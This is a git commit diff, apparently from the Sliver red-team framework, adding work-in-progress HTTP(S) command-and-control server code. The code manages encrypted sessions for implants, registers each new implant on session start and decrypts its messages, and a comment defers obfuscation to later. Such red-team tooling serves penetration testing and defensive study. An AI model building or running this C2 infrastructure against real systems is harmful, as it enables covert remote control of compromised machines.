8ea40fec18ee2b40df398d2263534ca25473ab45
moloch <moloch38@gmail.com>
2019-03-06 15:56:52 -0800

    WIP on session init/msg

--- server/c2/tcp-https.go
+++ server/c2/tcp-https.go
@@ -1,10 +1,12 @@
 package c2
 
 import (
+	"crypto/rand"
 	"crypto/sha256"
 	"crypto/tls"
 	"crypto/x509"
 	"encoding/base64"
+	"encoding/hex"
 	"encoding/pem"
 	"io/ioutil"
 	"log"
@@ -16,6 +18,7 @@ import (
 	"sync"
 	"time"
 
+	pb "sliver/protobuf/sliver"
 	sliverpb "sliver/protobuf/sliver"
 
 	"github.com/golang/protobuf/proto"
@@ -76,6 +79,24 @@ type httpSessions struct {
 	mutex    *sync.RWMutex
 }
 
+func (s *httpSessions) Add(session *HTTPSession) {
+	s.mutex.Lock()
+	defer s.mutex.Unlock()
+	(*s.sessions)[session.ID] = session
+}
+
+func (s *httpSessions) Get(sessionID string) *HTTPSession {
+	s.mutex.RLock()
+	defer s.mutex.RUnlock()
+	return (*s.sessions)[sessionID]
+}
+
+func (s *httpSessions) Remove(sessionID string) {
+	s.mutex.Lock()
+	defer s.mutex.Unlock()
+	delete((*s.sessions), sessionID)
+}
+
 // HTTPHandler - Path mapped to a handler function
 type HTTPHandler func(resp http.ResponseWriter, req *http.Request)
 
@@ -116,16 +137,15 @@ func StartHTTPSListener(conf *HTTPServerConfig) *SliverHTTPC2 {
 			mutex:    &sync.RWMutex{},
 		},
 	}
-	httpsServer := &http.Server{
+	server.HTTPServer = &http.Server{
 		Addr:         conf.Addr,
-		Handler:      httpSliverRouter(server),
+		Handler:      server.router(),
 		WriteTimeout: defaultHTTPTimeout,
 		ReadTimeout:  defaultHTTPTimeout,
 		IdleTimeout:  defaultHTTPTimeout,
 		TLSConfig:    tlsConf,
 		TLSNextProto: make(map[string]func(*http.Server, *tls.Conn, http.Handler), 0),
 	}
-	server.HTTPServer = httpsServer
 	return server
 }
 
@@ -139,26 +159,25 @@ func StartHTTPListener(conf *HTTPServerConfig) *SliverHTTPC2 {
 			mutex:    &sync.RWMutex{},
 		},
 	}
-	httpServer := &http.Server{
+	server.HTTPServer = &http.Server{
 		Addr:         conf.Addr,
-		Handler:      httpSliverRouter(server),
+		Handler:      server.router(),
 		WriteTimeout: defaultHTTPTimeout,
 		ReadTimeout:  defaultHTTPTimeout,
 		IdleTimeout:  defaultHTTPTimeout,
 	}
-	server.HTTPServer = httpServer
 	return server
 }
 
-func httpSliverRouter(server *SliverHTTPC2) *mux.Router {
+func (s *SliverHTTPC2) router() *mux.Router {
 	router := mux.NewRouter()
 
 	// This is a *functional* implementation, we'll obfuscate later
-	router.HandleFunc("/rsakey", server.rsaKeyHandler).Methods("GET")
-	router.HandleFunc("/start", server.startSessionHandler).Methods("POST")
-	router.HandleFunc("/session", server.sessionHandler).Methods("POST")
-	router.HandleFunc("/poll", server.pollHandler).Methods("GET")
-	router.HandleFunc("/stop", server.stopHandler).Methods("POST")
+	router.HandleFunc("/rsakey", s.rsaKeyHandler).Methods("GET")
+	router.HandleFunc("/start", s.startSessionHandler).Methods("POST")
+	router.HandleFunc("/session", s.sessionHandler).Methods("POST")
+	router.HandleFunc("/poll", s.pollHandler).Methods("GET")
+	router.HandleFunc("/stop", s.stopHandler).Methods("POST")
 
 	router.Use(loggingMiddleware)
 
@@ -176,7 +195,6 @@ func loggingMiddleware(next http.Handler) http.Handler {
 // This initial implementation is designed to be functional and reliable, it has not
 // been optimized for speed or stealth at this point. It contains little obfuscation
 // ---------------------------------------------------------------------------------
-
 func (s *SliverHTTPC2) rsaKeyHandler(resp http.ResponseWriter, req *http.Request) {
 	rootDir := assets.GetRootAppDir()
 	certPEM, _, _ := certs.GetServerRSACertificatePEM(rootDir, "slivers", s.Conf.Domain, false)
@@ -184,7 +202,6 @@ func (s *SliverHTTPC2) rsaKeyHandler(resp http.ResponseWriter, req *http.Request
 }
 
 func (s *SliverHTTPC2) startSessionHandler(resp http.ResponseWriter, req *http.Request) {
-
 	rootDir := assets.GetRootAppDir()
 	publicKeyPEM, privateKeyPEM, err := certs.GetServerRSACertificatePEM(rootDir, "slivers", s.Conf.Domain, false)
 	if err != nil {
@@ -208,9 +225,48 @@ func (s *SliverHTTPC2) startSessionHandler(resp http.ResponseWriter, req *http.R
 	sessionInit := &sliverpb.HTTPSessionInit{}
 	proto.Unmarshal(sessionInitData, sessionInit)
 
+	session := newSession()
+	session.Key, _ = cryptography.AESKeyFromBytes(sessionInit.Key)
+
+	session.Sliver = &core.Sliver{
+		ID:            core.GetHiveID(),
+		Transport:     "http(s)",
+		RemoteAddress: req.RemoteAddr,
+		Send:          make(chan *pb.Envelope, 16),
+		RespMutex:     &sync.RWMutex{},
+		Resp:          map[uint64]chan *pb.Envelope{},
+	}
+	core.Hive.AddSliver(session.Sliver)
+	s.Sessions.Add(session)
+
+	data, err := cryptography.GCMEncrypt(session.Key, []byte(session.ID))
+	if err != nil {
+		log.Printf("[http] Failed to encrypt session identifier")
+		resp.WriteHeader(404)
+		return
+	}
+	resp.Write(data)
 }
 
 func (s *SliverHTTPC2) sessionHandler(resp http.ResponseWriter, req *http.Request) {
+
+	sessionID := mux.Vars(req)["sessionid"]
+	session := s.Sessions.Get(sessionID)
+	if session == nil {
+		log.Printf("[http] No session with id %#v", sessionID)
+		resp.WriteHeader(404)
+		return
+	}
+
+	data, _ := ioutil.ReadAll(req.Body)
+	body, err := cryptography.GCMDecrypt(session.Key, data)
+	if err != nil {
+		log.Printf("[http] GCM decryption failed %v", err)
+		resp.WriteHeader(404)
+		return
+	}
+	envelope := &sliverpb.Envelope{}
+	proto.Unmarshal(body, envelope)
 
 }
 
@@ -220,4 +276,20 @@ func (s *SliverHTTPC2) pollHandler(resp http.ResponseWriter, req *http.Request) 
 
 func (s *SliverHTTPC2) stopHandler(resp http.ResponseWriter, req *http.Request) {
 
+}
+
+func newSession() *HTTPSession {
+	return &HTTPSession{
+		ID:            newHTTPSessionID(),
+		LastCheckin:   time.Now(),
+		msgQueue:      [][]byte{},
+		msgQueueMutex: &sync.Mutex{},
+	}
+}
+
+// newHTTPSessionID - Get a 128bit session ID
+func newHTTPSessionID() string {
+	buf := make([]byte, 16)
+	rand.Read(buf)
+	return hex.EncodeToString(buf)
 }
